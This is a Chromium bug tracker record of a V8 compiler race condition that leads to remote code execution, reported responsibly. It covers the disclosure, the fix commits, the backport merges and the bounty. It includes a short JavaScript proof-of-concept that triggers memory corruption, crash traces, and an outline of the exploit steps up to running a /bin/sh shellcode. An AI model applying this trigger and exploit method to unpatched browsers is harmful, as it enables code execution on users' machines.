# Security: Race condition in JSCreateLowering, leading to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [40061184](https://issues.chromium.org/issues/40061184) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ss...@gmail.com |
| **Assignee** | te...@chromium.org |
| **Created** | 2022-09-30 |
| **Bounty** | $20,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

## VULNERABILITY DETAILS

In JSCreateLowering, when reducing `CreateLiteralArray`, it will call `TryAllocateFastLiteral` to build the `boilerplate`. In the function `TryAllocateFastLiteral`, it will first get the boilerplate's map [1] and then call the function `TryAllocateFastLiteralElements` to build the element. In `TryAllocateFastLiteralElements`, it will first read the element map[2] and the build the element. But the boilerplate's map and its element map may be updated in the main thread. For example, when  

elements kind transitions happen, `SetMapAndElements`[3] will be called to update the boilerplate's map and element map.  

So there are two ways to construct a literal array whose map and element map do not match.

```
Update map -> Read map -> Read element map -> Update element map  
Read map -> Update map -> Update element map -> Read element map  

```

[1] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-create-lowering.cc;drc=a432cd59d51281057ba2a2673ca645a9600bb927;l=1675>  

[2] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-create-lowering.cc;drc=a432cd59d51281057ba2a2673ca645a9600bb927;l=1844>  

[3] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects-inl.h;drc=a432cd59d51281057ba2a2673ca645a9600bb927;l=245>

## VERSION

V8 Version: 10.6.194.12 stable && head  

Operating System: Test on Ubuntu 20.04, should exist in all platform

## REPRODUCTION CASE

```
function sleep(miliseconds) {  
  var currentTime = new Date().getTime();  
  while (currentTime + miliseconds >= new Date().getTime()) {}  
}  
  
function a(f){  
  let c = [1.1,2.2,,4.4];  
  let aaa = Math.log(2);  
  if(f) c[0] = {};  
  return c;  
}  
  
for(let i=0;i<4516;i++) a(false);  
a(false);  
  
a(true);  
  
sleep(1000);  
  
let corrupt = a(false);  
console.log(corrupt[3]);  

```

This bug is difficult to trigger, so I write a simple patch to make it trigger steadily. This patch is attached as `lock.diff`. This patch will not affect the logic of v8, just let race trigger steadily.

On debug builds this crashes here:

```
#  
# Fatal error in ../../src/objects/object-type.cc, line 48  
# Type cast failed in CAST(elements) at ../../src/ic/accessor-assembler.cc:2365  
  Expected FixedArray but found 0x2b0a00161f1d: [FixedDoubleArray]  
 - map: 0x2b0a00002ab9 <Map(FIXED_DOUBLE_ARRAY_TYPE)>  
 - length: 4  
           0: 1.1  
           1: 2.2  
           2: <the_hole>  
           3: 4.4  

```

On release builds with the patch, it will get SEGV

```
Received signal 11 SEGV_ACCERR 37af40019998  
  
==== C stack trace ===============================  
  
 [0x5629b0be5dd6]  
 [0x7f708901c420]  
 [0x56293fee846a]  
[end of stack trace]  
[1]    2257501 segmentation fault (core dumped)  ./v8/out.gn/x64.release/d8 poc.js  

```
## EXPLOIT

The exploit is attach as `exp.js`.  

`./v8/out.gn/x64.release/d8 exp.js`

1. trigger the bug, get some fake objects in `fake_str`.
2. construct `addrof`, `fakeobj`, `caged_read` and `caged_write` primitives.
3. to bypass the v8 sandbox and v8 flags write protection, we change the function's `code_entry_point` to the middle of the instruction to execute our shellcode.

With `lock.diff`, this exp will exec `/bin/sh` steadily.  

Without the patch, it is hard to trigger the bug at one time. Fortunately, if the bug is not triggered, the main thread will not crash. So we can setup many workers in many iframes to continue to trigger the bug. It can be found that this vulnerability can be easily triggered when the CPU pressure is high. I can provide the exploit without the patch if you want.

## FIX

A suggested patch for this is attached as `patch.diff`

## CREDIT INFORMATION

Reporter credit: srodulv and ZNMchtss at S.S.L Team

## Attachments

- [lock.diff](attachments/lock.diff) (text/plain, 1.7 KB)
- [poc.js](attachments/poc.js) (text/plain, 348 B)
- [gen.py](attachments/gen.py) (text/plain, 1.8 KB)
- [exp.js](attachments/exp.js) (text/plain, 3.4 KB)
- [patch.diff](attachments/patch.diff) (text/plain, 2.4 KB)

## Timeline

### [Deleted User] (2022-09-30)

[Empty comment from Monorail migration]

### ss...@gmail.com (2022-09-30)

[Empty comment from Monorail migration]

### mp...@chromium.org (2022-09-30)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Compiler]

### [Deleted User] (2022-09-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-30)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### te...@chromium.org (2022-10-04)

[Empty comment from Monorail migration]

### te...@chromium.org (2022-10-05)

[Empty comment from Monorail migration]

### te...@chromium.org (2022-10-06)

Thanks a lot for this report!

### gi...@appspot.gserviceaccount.com (2022-10-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/ebe5675360e4735589a92a8836303822da79a8f4

commit ebe5675360e4735589a92a8836303822da79a8f4
Author: Tobias Tebbi <tebbi@chromium.org>
Date: Thu Oct 06 11:43:19 2022

[turbofan] validate more concurrent reads

Bug: chromium:1369871
Change-Id: Ib8786b97b2f9555cfcb84a197182c4f2ab5c30e8
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3936273
Reviewed-by: Jakob Linke <jgruber@chromium.org>
Auto-Submit: Tobias Tebbi <tebbi@chromium.org>
Commit-Queue: Tobias Tebbi <tebbi@chromium.org>
Cr-Commit-Position: refs/heads/main@{#83555}

[modify] https://crrev.com/ebe5675360e4735589a92a8836303822da79a8f4/src/compiler/compilation-dependencies.h
[modify] https://crrev.com/ebe5675360e4735589a92a8836303822da79a8f4/src/compiler/compilation-dependencies.cc
[modify] https://crrev.com/ebe5675360e4735589a92a8836303822da79a8f4/src/compiler/js-create-lowering.cc


### [Deleted User] (2022-10-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-06)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M106. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M107. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-07)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1369871&entry.364066060=External&entry.958145677=Android&entry.958145677=Chrome&entry.958145677=Fuchsia&entry.958145677=Linux&entry.958145677=Mac&entry.958145677=Windows&entry.958145677=Lacros&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript>Compiler&entry.975983575=tebbi@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-07)

Merge review required: M107 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-07)

Merge review required: M106 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### te...@chromium.org (2022-10-10)

1. Why does your merge fit within the merge criteria for these milestones?

It's a low-risk backmerge fixing an exploitable security issue.

2. What changes specifically would you like to merge? Please link to Gerrit.

https://chromium-review.googlesource.com/c/v8/v8/+/3936273

3. Have the changes been released and tested on canary?

Yes: 108.0.5345.0

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No

### am...@chromium.org (2022-10-13)

m107 merge approved, please merge to the relevant v8 branch for m107 as soon as possible so this fix can be included in the next m107/beta 
m106 merge approved, please merge to the relevant v8 branch for m106 at your earliest convenience so this fix can be included in the m106/Extended update when m107 is promoted to stable -- thank you

### am...@google.com (2022-10-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-10-14)

Congratulations S.S.L. Team! The VRP Panel has decided to award you $20,000 for this report with V8 exploit bonus. Nice finding and report - thank you for your efforts in finding and reporting this issue to us! 

### te...@chromium.org (2022-10-14)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-10-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/49acaa23f387c2c36a678fcb17f33a27e0b658a3

commit 49acaa23f387c2c36a678fcb17f33a27e0b658a3
Author: Tobias Tebbi <tebbi@chromium.org>
Date: Thu Oct 06 11:43:19 2022

Merged: [turbofan] validate more concurrent reads

Bug: chromium:1369871
(cherry picked from commit ebe5675360e4735589a92a8836303822da79a8f4)

Change-Id: If73a7aa831bf672d237f27c946c26e36bec23d70
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3952102
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Tobias Tebbi <tebbi@chromium.org>
Cr-Commit-Position: refs/branch-heads/10.7@{#30}
Cr-Branched-From: 4d2145cfb13e82642cda005b2f3fc7fad8ce0f67-refs/heads/10.7.193@{#1}
Cr-Branched-From: 95216968f57b136d9ef7afbbe40c9970b2758520-refs/heads/main@{#83201}

[modify] https://crrev.com/49acaa23f387c2c36a678fcb17f33a27e0b658a3/src/compiler/compilation-dependencies.h
[modify] https://crrev.com/49acaa23f387c2c36a678fcb17f33a27e0b658a3/src/compiler/compilation-dependencies.cc
[modify] https://crrev.com/49acaa23f387c2c36a678fcb17f33a27e0b658a3/src/compiler/js-create-lowering.cc


### [Deleted User] (2022-10-14)

LTS Milestone M102

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2022-10-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/194bcc127f21f940b128438f3c0d5136a03f97e7

commit 194bcc127f21f940b128438f3c0d5136a03f97e7
Author: Tobias Tebbi <tebbi@chromium.org>
Date: Thu Oct 06 11:43:19 2022

Merged: [turbofan] validate more concurrent reads

Bug: chromium:1369871
(cherry picked from commit ebe5675360e4735589a92a8836303822da79a8f4)

Change-Id: I49243d2c604cb4635d0d49a572245f7469eabffa
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3952937
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Tobias Tebbi <tebbi@chromium.org>
Cr-Commit-Position: refs/branch-heads/10.6@{#41}
Cr-Branched-From: 41bc7435693fbce8ef86753cd9239e30550a3e2d-refs/heads/10.6.194@{#1}
Cr-Branched-From: d5f29b929ce7746409201d77f44048f3e9529b40-refs/heads/main@{#82548}

[modify] https://crrev.com/194bcc127f21f940b128438f3c0d5136a03f97e7/src/compiler/compilation-dependencies.h
[modify] https://crrev.com/194bcc127f21f940b128438f3c0d5136a03f97e7/src/compiler/compilation-dependencies.cc
[modify] https://crrev.com/194bcc127f21f940b128438f3c0d5136a03f97e7/src/compiler/js-create-lowering.cc


### gi...@appspot.gserviceaccount.com (2022-10-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/d0882074ff5dc19a5fb04b4457da8cdf001a02c9

commit d0882074ff5dc19a5fb04b4457da8cdf001a02c9
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Fri Oct 14 11:57:01 2022

Roll v8 10.7 from c17b39cb7090 to 28f763b5949d (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/c17b39cb7090..28f763b5949d

2022-10-14 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 10.7.193.16
2022-10-14 tebbi@chromium.org Merged: [turbofan] validate more concurrent reads

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-chromium-release-0
Please CC v8-waterfall-sheriff@grotations.appspotmail.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 10.7: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m107: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1369871
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: I78d7f7df3c824efc020aa9e564b09eb86ab2c31a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3955324
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5304@{#752}
Cr-Branched-From: 5d7b1fc9cb7103d9c82eed647cf4be38cf09738b-refs/heads/main@{#1047731}

[modify] https://crrev.com/d0882074ff5dc19a5fb04b4457da8cdf001a02c9/DEPS


### te...@chromium.org (2022-10-14)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-10-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/065e655d11c39d39153946e646db1355933faf63

commit 065e655d11c39d39153946e646db1355933faf63
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Fri Oct 14 12:27:36 2022

Roll v8 10.6 from e87f86d08c48 to 74c2f33b1939 (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/e87f86d08c48..74c2f33b1939

2022-10-14 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 10.6.194.21
2022-10-14 tebbi@chromium.org Merged: [turbofan] validate more concurrent reads

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-chromium-release-1
Please CC v8-waterfall-sheriff@grotations.appspotmail.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 10.6: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m106: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1369871
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: Id6971f692f433fff2f6356d42105c68a1e0dba8b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3955462
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5249@{#837}
Cr-Branched-From: 4f7bea5de862aaa52e6bde5920755a9ef9db120b-refs/heads/main@{#1036826}

[modify] https://crrev.com/065e655d11c39d39153946e646db1355933faf63/DEPS


### am...@google.com (2022-10-14)

[Empty comment from Monorail migration]

### rz...@google.com (2022-10-17)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-17)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-10-17)

1. Just https://crrev.com/c/3960228
2. Low, no conflicts
3. 106, 107
4. Yes

### gm...@google.com (2022-10-18)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-10-21)

[Empty comment from Monorail migration]

### gm...@google.com (2022-10-26)

[Empty comment from Monorail migration]

### am...@google.com (2022-10-27)

[Empty comment from Monorail migration]

### rz...@google.com (2022-10-27)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/719a5e1f3ec7939fef8653aac2f472aa5b614043

commit 719a5e1f3ec7939fef8653aac2f472aa5b614043
Author: Tobias Tebbi <tebbi@chromium.org>
Date: Thu Oct 06 11:43:19 2022

[M102-LTS][turbofan] validate more concurrent reads

(cherry picked from commit ebe5675360e4735589a92a8836303822da79a8f4)

Bug: chromium:1369871
No-Try: true
No-Presubmit: true
No-Tree-Checks: true
Change-Id: Ib8786b97b2f9555cfcb84a197182c4f2ab5c30e8
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3936273
Auto-Submit: Tobias Tebbi <tebbi@chromium.org>
Commit-Queue: Tobias Tebbi <tebbi@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#83555}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3960228
Reviewed-by: Tobias Tebbi <tebbi@chromium.org>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Reviewed-by: Artem Sumaneev <asumaneev@google.com>
Cr-Commit-Position: refs/branch-heads/10.2@{#35}
Cr-Branched-From: 374091f382e88095694c1283cbdc2acddc1b1417-refs/heads/10.2.154@{#1}
Cr-Branched-From: f0c353f6315eeb2212ba52478983a3b3af07b5b1-refs/heads/main@{#79976}

[modify] https://crrev.com/719a5e1f3ec7939fef8653aac2f472aa5b614043/src/compiler/compilation-dependencies.h
[modify] https://crrev.com/719a5e1f3ec7939fef8653aac2f472aa5b614043/src/compiler/compilation-dependencies.cc
[modify] https://crrev.com/719a5e1f3ec7939fef8653aac2f472aa5b614043/src/compiler/js-create-lowering.cc


### gi...@appspot.gserviceaccount.com (2022-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/bbb0c57b237bb92fd59521e4d68239a3d9ea7dc7

commit bbb0c57b237bb92fd59521e4d68239a3d9ea7dc7
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Oct 27 16:15:34 2022

Roll v8 10.2 from 681b5d72a0b0 to e28201f2ea3f (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/681b5d72a0b0..e28201f2ea3f

2022-10-27 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 10.2.154.19
2022-10-27 tebbi@chromium.org [M102-LTS][turbofan] validate more concurrent reads

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-chromium-release-3
Please CC v8-waterfall-sheriff@grotations.appspotmail.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 10.2: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m102: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1369871
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: I5eaa9a0941eeabc712ad0465ea88ae8bfe80aa1b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3987224
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5005@{#1377}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/bbb0c57b237bb92fd59521e4d68239a3d9ea7dc7/DEPS


### pg...@google.com (2022-11-01)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1369871?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061184)*
